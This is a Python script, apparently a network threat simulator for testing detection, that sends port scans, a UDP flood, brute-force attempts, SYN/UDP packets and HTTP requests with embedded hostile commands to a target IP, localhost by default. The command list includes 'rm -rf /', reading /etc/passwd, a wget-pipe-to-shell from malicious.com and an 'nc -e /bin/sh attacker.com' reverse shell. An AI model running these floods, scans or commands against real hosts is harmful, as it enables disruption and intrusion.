import socket
import random
import time
from threading import Thread
from scapy.all import IP, TCP, UDP, send

class ThreatSimulator:
    def __init__(self, target_ip="127.0.0.1", count=5):
        self.target_ip = target_ip
        self.count = count
        self.running = False
        self.threat_types = {
            "Port Scan": self.simulate_port_scan,
            "DDoS Attack": self.simulate_ddos,
            "Brute Force": self.simulate_brute_force,
            "Malicious Payload": self.simulate_malicious_payload,
            "Suspicious Traffic": self.simulate_suspicious_traffic
        }

    def simulate_threat(self, threat_type):
        """Main method to run threat simulation"""
        if threat_type in self.threat_types:
            self.running = True
            print(f"Starting {threat_type} simulation...")
            self.threat_types[threat_type]()
            print(f"{threat_type} simulation completed.")
        else:
            print(f"Unknown threat type: {threat_type}")

    def simulate_port_scan(self):
        """Simulate port scanning activity"""
        ports = [21, 22, 23, 80, 443, 3389, 8080]  # Commonly scanned ports
        for _ in range(self.count):
            if not self.running:
                break
            port = random.choice(ports)
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.target_ip, port))
                print(f"Port scan attempt on port {port}")
                sock.close()
            except Exception as e:
                print(f"Port scan error: {e}")
            time.sleep(0.5)

    def simulate_ddos(self):
        """Simulate distributed denial of service attack"""
        threads = []
        for i in range(self.count * 10):  # Increased request count
            if not self.running:
                break
            t = Thread(target=self._send_flood_packet)
            threads.append(t)
            t.start()
            time.sleep(0.1)
        
        for t in threads:
            t.join()

    def _send_flood_packet(self):
        """Helper method to send flood packets"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"Flood Packet", (self.target_ip, random.randint(1024, 65535)))
            s.close()
            print("DDoS packet sent")
        except Exception as e:
            print(f"DDoS error: {e}")

    def simulate_brute_force(self):
        """Simulate brute force login attempts"""
        common_passwords = ["admin", "password", "123456", "qwerty", "root"]
        for i in range(self.count):
            if not self.running:
                break
            password = random.choice(common_passwords)
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.target_ip, 22))  # SSH port
                sock.send(f"login:{password}\n".encode())
                print(f"Brute force attempt with password: {password}")
                sock.close()
            except Exception as e:
                print(f"Brute force error: {e}")
            time.sleep(1)

    def simulate_malicious_payload(self):
        """Simulate sending malicious commands"""
        malicious_commands = [
            "rm -rf /",
            "cat /etc/passwd",
            "wget http://malicious.com/script.sh -O- | sh",
            "nc -e /bin/sh attacker.com 4444"
        ]
        for i in range(self.count):
            if not self.running:
                break
            cmd = random.choice(malicious_commands)
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.target_ip, 80))
                sock.send(f"GET /?cmd={cmd} HTTP/1.1\r\nHost: {self.target_ip}\r\n\r\n".encode())
                print(f"Malicious payload sent: {cmd[:20]}...")
                sock.close()
            except Exception as e:
                print(f"Payload error: {e}")
            time.sleep(1.5)

    def simulate_suspicious_traffic(self):
        """Simulate suspicious network traffic using Scapy"""
        for i in range(self.count):
            if not self.running:
                break
            if random.choice([True, False]):
                packet = IP(dst=self.target_ip)/TCP(dport=random.randint(1, 65535), flags="S")  # SYN scan
                send(packet, verbose=0)
                print(f"Sent suspicious TCP packet to port {packet[TCP].dport}")
            else:
                packet = IP(dst=self.target_ip)/UDP(dport=random.randint(1, 65535))
                send(packet, verbose=0)
                print(f"Sent suspicious UDP packet to port {packet[UDP].dport}")
            time.sleep(0.8)

    def stop(self):
        """Stop all simulations"""
        self.running = False


if __name__ == "__main__":
    print("Network Threat Simulator")
    print("Available threat types:")
    simulator = ThreatSimulator()
    for i, threat in enumerate(simulator.threat_types.keys(), 1):
        print(f"{i}. {threat}")
    
    choice = input("Select threat type (number): ")
    try:
        threat_type = list(simulator.threat_types.keys())[int(choice)-1]
        simulator.simulate_threat(threat_type)
    except (ValueError, IndexError):
        print("Invalid selection")